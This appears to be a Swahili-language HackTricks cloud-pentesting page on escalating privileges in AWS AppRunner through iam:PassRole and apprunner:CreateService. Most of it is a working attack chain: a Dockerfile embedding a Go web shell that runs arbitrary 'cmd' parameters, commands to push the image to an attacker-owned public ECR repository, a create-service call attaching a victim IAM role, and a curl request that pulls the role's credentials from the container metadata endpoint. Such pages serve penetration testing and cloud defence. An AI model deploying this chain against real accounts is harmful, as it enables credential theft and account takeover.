# AWS - AppRunner Privesc

{{#include ../../../banners/hacktricks-training.md}}

## AppRunner

### `iam:PassRole`, `apprunner:CreateService`

Mshambuliaji mwenye ruhusa hizi anaweza kuunda huduma ya AppRunner yenye jukumu la IAM lililounganishwa, na hivyo kuongeza mamlaka kwa kufikia akiba za jukumu hilo.

Mshambuliaji kwanza huunda Dockerfile inayotumika kama shell ya wavuti kutekeleza amri za kawaida kwenye kontena la AppRunner.
```Dockerfile
FROM golang:1.24-bookworm
WORKDIR /app
RUN apt-get update && apt-get install -y ca-certificates curl
RUN cat <<'EOF' > main.go
package main

import (
"fmt"
"net/http"
"os/exec"
)

func main() {
http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
command := exec.Command("sh", "-c", r.URL.Query().Get("cmd"))
output, err := command.CombinedOutput()
if err != nil {
fmt.Fprint(w, err.Error(), output)
return
}

fmt.Fprint(w, string(output))
})
http.ListenAndServe("0.0.0.0:3000", nil)
}
EOF
RUN go mod init test && go build -o main .
EXPOSE 3000
CMD ["./main"]
```
Kisha, sukuma picha hii kwenye hifadhi ya ECR.  
Kwa kusukuma picha hiyo kwenye hifadhi ya umma katika akaunti ya AWS inayodhibitiwa na mshambuliaji, kupanda kwa mamlaka kunawezekana hata kama akaunti ya mwathirika haina ruhusa za kudhibiti ECR.
```sh
IMAGE_NAME=public.ecr.aws/<alias>/<namespace>/<repo-name>:latest
docker buildx build --platform linux/amd64 -t $IMAGE_NAME .
aws ecr-public get-login-password | docker login --username AWS --password-stdin public.ecr.aws
docker push $IMAGE_NAME
docker logout public.ecr.aws
```
Kisha, mshambuliaji anaunda huduma ya AppRunner iliyo na picha hii ya web shell na IAM Role wanayotaka kutumia.
```bash
aws apprunner create-service \
--service-name malicious-service \
--source-configuration '{
"ImageRepository": {
"ImageIdentifier": "public.ecr.aws/<alias>/<namespace>/<repo-name>:latest",
"ImageRepositoryType": "ECR_PUBLIC",
"ImageConfiguration": { "Port": "3000" }
}
}' \
--instance-configuration '{"InstanceRoleArn": "arn:aws:iam::123456789012:role/AppRunnerRole"}' \
--query Service.ServiceUrl
```
Baada ya kusubiri kumalizika kwa uundaji wa huduma, tumia shell ya wavuti kupata akreditif za kontena na kupata ruhusa za IAM Role iliyoambatanishwa na AppRunner.
```sh
curl 'https://<service-url>/?cmd=curl+http%3A%2F%2F169.254.170.2%24AWS_CONTAINER_CREDENTIALS_RELATIVE_URI'
```
**Madhara Yanayoweza Kutokea:** Kuinua kibali moja kwa moja kwa yoyote IAM role ambayo inaweza kuunganishwa na huduma za AppRunner.

{{#include ../../../banners/hacktricks-training.md}}
